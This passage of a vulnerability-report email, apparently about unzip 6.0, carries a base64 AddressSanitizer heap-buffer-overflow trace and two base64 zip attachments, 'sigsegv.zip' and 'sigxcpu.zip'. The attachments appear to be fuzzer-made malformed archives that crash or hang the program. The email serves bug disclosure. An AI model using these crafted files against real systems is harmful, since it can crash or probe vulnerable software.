+KGF0dGVtcHRpbmcgdG8gcHJvY2VzcyBhbnl3YXkpCmVycm9yIFtidWdneS5m
+dXp6ZWQuc2lnc2Vndi56aXBdOiAgcmVwb3J0ZWQgbGVuZ3RoIG9mIGNlbnRy
+YWwgZGlyZWN0b3J5IGlzCiAgLTExIGJ5dGVzIHRvbyBsb25nIChBdGFyaSBT
+VFppcCB6aXBmaWxlPyAgSi5ILkhvbG0gWklQU1BMSVQgMS4xCiAgemlwZmls
+ZT8pLiAgQ29tcGVuc2F0aW5nLi4uCmM/TV5eW0JLPz86ICBtaXNtYXRjaGlu
+ZyAibG9jYWwiIGZpbGVuYW1lIChjP01eXlpCSz8/KSwKICAgICAgICAgY29u
+dGludWluZyB3aXRoICJjZW50cmFsIiBmaWxlbmFtZSB2ZXJzaW9uCiAgZXJy
+b3I6ICBpbnZhbGlkIGNvbXByZXNzZWQgZGF0YSB0byBpbmZsYXRlIGM/TV5e
+W0JLPz8KZmlsZSAjMjogIGJhZCB6aXBmaWxlIG9mZnNldCAobG9jYWwgaGVh
+ZGVyIHNpZyk6ICAxNzkKXlxeRntgMFooNXguOiAgbWlzbWF0Y2hpbmcgImxv
+Y2FsIiBmaWxlbmFtZSAoYz9NXl5aQks/PyksCiAgICAgICAgIGNvbnRpbnVp
+bmcgd2l0aCAiY2VudHJhbCIgZmlsZW5hbWUgdmVyc2lvbgpeXF5Ge2AwWig1
+eC46ICB1Y3NpemUgNyA8PiBjc2l6ZSAyIGZvciBTVE9SRUQgZW50cnkKICAg
+ICAgICAgY29udGludWluZyB3aXRoICJjb21wcmVzc2VkIiBzaXplIHZhbHVl
+Cl5cXkZ7YDBaKDV4LiAgICAgICAgICAgIGJhZCBDUkMgMGU5ODg0MzggIChz
+aG91bGQgYmUgMDAwMDAwMGEpCl4/Py5MP2hwOiAgdWNzaXplIDI2NCA8PiBj
+c2l6ZSAxODQ0Njc0NDA3MzcwOTU1MTYxMSBmb3IgU1RPUkVEIGVudHJ5CiAg
+ICAgICAgIGNvbnRpbnVpbmcgd2l0aCAiY29tcHJlc3NlZCIgc2l6ZSB2YWx1
+ZQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PQo9PTQzOTQ9PSBFUlJPUjogQWRkcmVz
+c1Nhbml0aXplcjogaGVhcC1idWZmZXItb3ZlcmZsb3cgb24gYWRkcmVzcyAw
+eGI1MjAyMTA0IGF0IHBjIDB4ODA1MDBjMCBicCAweGJmZmZlZGI4IHNwIDB4
+YmZmZmVkYWMKUkVBRCBvZiBzaXplIDEgYXQgMHhiNTIwMjEwNCB0aHJlYWQg
+VDAKICAgICMwIDB4ODA1MDBiZiAoL2hvbWUvdmFncmFudC9zYW5kL3Vuemlw
+LTYuMC91bnppcCsweDgwNTAwYmYpCiAgICAjMSAweDgwNTA5MTEgKC9ob21l
+L3ZhZ3JhbnQvc2FuZC91bnppcC02LjAvdW56aXArMHg4MDUwOTExKQogICAg
+IzIgMHg4MDU4Mzc5ICgvaG9tZS92YWdyYW50L3NhbmQvdW56aXAtNi4wL3Vu
+emlwKzB4ODA1ODM3OSkKICAgICMzIDB4ODA1ZDExMSAoL2hvbWUvdmFncmFu
+dC9zYW5kL3VuemlwLTYuMC91bnppcCsweDgwNWQxMTEpCiAgICAjNCAweDgw
+N2JiOTcgKC9ob21lL3ZhZ3JhbnQvc2FuZC91bnppcC02LjAvdW56aXArMHg4
+MDdiYjk3KQogICAgIzUgMHg4MDRlZTA3ICgvaG9tZS92YWdyYW50L3NhbmQv
+dW56aXAtNi4wL3VuemlwKzB4ODA0ZWUwNykKICAgICM2IDB4ODA0OTk2ZiAo
+L2hvbWUvdmFncmFudC9zYW5kL3VuemlwLTYuMC91bnppcCsweDgwNDk5NmYp
+CiAgICAjNyAweGI2ODVhYTgyICgvbGliL2kzODYtbGludXgtZ251L2xpYmMt
+Mi4xOS5zbysweDE5YTgyKQogICAgIzggMHg4MDQ5YjgwICgvaG9tZS92YWdy
+YW50L3NhbmQvdW56aXAtNi4wL3VuemlwKzB4ODA0OWI4MCkKMHhiNTIwMjEw
+NCBpcyBsb2NhdGVkIDAgYnl0ZXMgdG8gdGhlIHJpZ2h0IG9mIDgxOTYtYnl0
+ZSByZWdpb24gWzB4YjUyMDAxMDAsMHhiNTIwMjEwNCkKYWxsb2NhdGVkIGJ5
+IHRocmVhZCBUMCBoZXJlOgogICAgIzAgMHhiNmEwNTg1NCAoL3Vzci9saWIv
+aTM4Ni1saW51eC1nbnUvbGliYXNhbi5zby4wLjAuMCsweDE2ODU0KQogICAg
+IzEgMHg4MDc5OGY5ICgvaG9tZS92YWdyYW50L3NhbmQvdW56aXAtNi4wL3Vu
+emlwKzB4ODA3OThmOSkKICAgICMyIDB4YmZmZmY4YjYgKFtzdGFja10rMHgy
+MDhiNikKU2hhZG93IGJ5dGVzIGFyb3VuZCB0aGUgYnVnZ3kgYWRkcmVzczoK
+ICAweDM2YTQwM2QwOiAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAw
+MCAwMCAwMCAwMCAwMCAwMAogIDB4MzZhNDAzZTA6IDAwIDAwIDAwIDAwIDAw
+IDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwCiAgMHgzNmE0MDNm
+MDogMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAg
+MDAgMDAKICAweDM2YTQwNDAwOiAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAw
+MCAwMCAwMCAwMCAwMCAwMCAwMCAwMAogIDB4MzZhNDA0MTA6IDAwIDAwIDAw
+IDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwCj0+MHgz
+NmE0MDQyMDpbMDRdZmEgZmEgZmEgZmEgZmEgZmEgZmEgZmEgZmEgZmEgZmEg
+ZmEgZmEgZmEgZmEKICAweDM2YTQwNDMwOiBmYSBmYSBmYSBmYSBmYSBmYSBm
+YSBmYSBmYSBmYSBmYSBmYSBmYSBmYSBmYSBmYQogIDB4MzZhNDA0NDA6IGZh
+IGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZh
+CiAgMHgzNmE0MDQ1MDogZmEgZmEgZmEgZmEgZmEgZmEgZmEgZmEgZmEgZmEg
+ZmEgZmEgZmEgZmEgZmEgZmEKICAweDM2YTQwNDYwOiBmYSBmYSBmYSBmYSBm
+YSBmYSBmYSBmYSBmYSBmYSBmYSBmYSBmYSBmYSBmYSBmYQogIDB4MzZhNDA0
+NzA6IGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZhIGZh
+IGZhIGZhClNoYWRvdyBieXRlIGxlZ2VuZCAob25lIHNoYWRvdyBieXRlIHJl
+cHJlc2VudHMgOCBhcHBsaWNhdGlvbiBieXRlcyk6CiAgQWRkcmVzc2FibGU6
+ICAgICAgICAgICAwMAogIFBhcnRpYWxseSBhZGRyZXNzYWJsZTogMDEgMDIg
+MDMgMDQgMDUgMDYgMDcgCiAgSGVhcCBsZWZ0IHJlZHpvbmU6ICAgICBmYQog
+IEhlYXAgcmlnaCByZWR6b25lOiAgICAgZmIKICBGcmVlZCBIZWFwIHJlZ2lv
+bjogICAgIGZkCiAgU3RhY2sgbGVmdCByZWR6b25lOiAgICBmMQogIFN0YWNr
+IG1pZCByZWR6b25lOiAgICAgZjIKICBTdGFjayByaWdodCByZWR6b25lOiAg
+IGYzCiAgU3RhY2sgcGFydGlhbCByZWR6b25lOiBmNAogIFN0YWNrIGFmdGVy
+IHJldHVybjogICAgZjUKICBTdGFjayB1c2UgYWZ0ZXIgc2NvcGU6IGY4CiAg
+R2xvYmFsIHJlZHpvbmU6ICAgICAgICBmOQogIEdsb2JhbCBpbml0IG9yZGVy
+OiAgICAgZjYKICBQb2lzb25lZCBieSB1c2VyOiAgICAgIGY3CiAgQVNhbiBp
+bnRlcm5hbDogICAgICAgICBmZQo9PTQzOTQ9PSBBQk9SVElORwo=
+
+--001a11c3c34caf0138051f26f3e9
+Content-Type: application/zip; name="sigsegv.zip"
+Content-Disposition: attachment; filename="sigsegv.zip"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_ie9ufevc0
+
+UEsDBBQAAggIAAAAIQAMAAAAAwAAAA0AAAAMAAcQY8OlTV4aQkvCr8K1EwoN
+CQUKQxALUEsDBBQAAggAAAAAIQAKAAAICwAAAAUAAAAKAA0AHAZ7YDBaKDV4
+Lg8GEAoLAAwCAw4NDFBLAwQUAAIIAAAAICEACgAAAAIAAAAHAAAAAAAHAAoM
+BgcOCQ0HAA4EClBLAwQUAAIIAAAAACEADQAAAAcAAAAIAQAACwAJAF7Cu8KI
+LkzDoGhwDQ0PDQeADQoQEAcMBQUIBg1QSwMEFAACCAgAAAAhAAIAAAAMAgAA
+BAAAAAsABADCpHFcLcKiccKmFQIGEAoQCgdQSwMEFCECCAAAAAAhAA8AAAAQ
+AABAAAAAAAEAAwAiDQwjAAsNB1BLAQIAABQAAggIAAAAIQAMAAAAAwAAAA0A
+AAAMAAcABAAAAAYACQAAAAAAAABjw6VNXhtCS8KvwrUDCg0LBQoDDxADAVBL
+AQIAABQAAgwAAAAAIQAKAAAACwAAAAUAAAAKAAUABwAAAAMAEAEAALMAAAAc
+BntgMFooNXguDwYQCgsKAAgQAwYPUEsBAgAAFAACCAAAAAAhAAoAAAACAAAE
+BwAAAAAABwAJAAAAAQAGAAAAZwAAAAoMBgcOCQ0DBggBEAUMDgZQSwECAAAU
+AAMIAAAAACEADRAABAcAAAAIAAAACwAJAAIAAAAHAAcAAACRAAAAXsK7wogu
+TMOgaHANDQ8NBwANChAJCVBLAQIAABQAAggIAAAAIQACAAAADAAAAAQAAAAL
+AAQACQAAAAQACAAAAMsAAADCpHFcLcKiccKmFQIGEAoHCA0CEAgNDgJQSwEC
+AAAUAAIIAAAAACEQDwAAABAAAAAAAAAAAQADAAcAAAADAAAAAAD7AAAAIg0M
+AwQGDQoIAAxQSwUFBQAKBAsIDFBLBQYAAAAABgAGAIoBAAAhAQAABAAECg0J
+
+--001a11c3c34caf0138051f26f3e9
+Content-Type: application/zip; name="sigxcpu.zip"
+Content-Disposition: attachment; filename="sigxcpu.zip"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_ie9ufewa1
+
+UEsDBBQAAggAAAAAIQADAAAAAAAAAAIAAAACAAQAwpQDAAMAAgJQSwMEFAAC
+CAwAAAAhAAEAAAAAAAAAAwAAAAYABAA4w7ZKw6EDAQQAAwQDAAFQSwMGFAAC
+CAgAAAAhAAMAAAACAAAAAQAAAAAAAAACAwABAwNQSwMEFAACCAgAAAAhAAIA
+AAAEAAAAAQAAAAUABQBvT35NRAMEAAEDBANQSwMEFAACCAAAAAAhAAQAAAAE
+AAAAAwAAAAYAAgARSsOlwpACBFBLAQIAABQAAggAAAAAIQADAAAAEAAAAAIA
+AAACAAQAAgAAAAEABAAAAAAAAADClAMAAwAAA1BLAQIAABQAAggMAAAAMQAB
+AAAAAAAAAAMEAAAGAAQAAAAAAAEABAAAACYAAAA4w7ZIw6EDAQQAUEsBAgAA
+FAACCAAAACAhAAMAAAACAAAAAQAAAAAAAAAEAAAABAABAAAAUwAAAAACAQJQ
+SwECAAAUAAIICAAAACEQAgAAAAQAAAABAAAABQAFAAYAAAAAAAIAAAB3AAAA
+b09+TUQDBAABAwMBAQEAAVBLAQIAABQAAggAAAAAIQAEAAAABAAAAAMAAAAG
+AAIAhAAAAAAAAAAAAKEAAAARSsOlwpACBAQAAARQSwUFBABCBAMBUEsFBgAA
+AAAFAAUACAEAAMcAAABFAAECAgMB
+
+--001a11c3c34caf0138051f26f3e9--
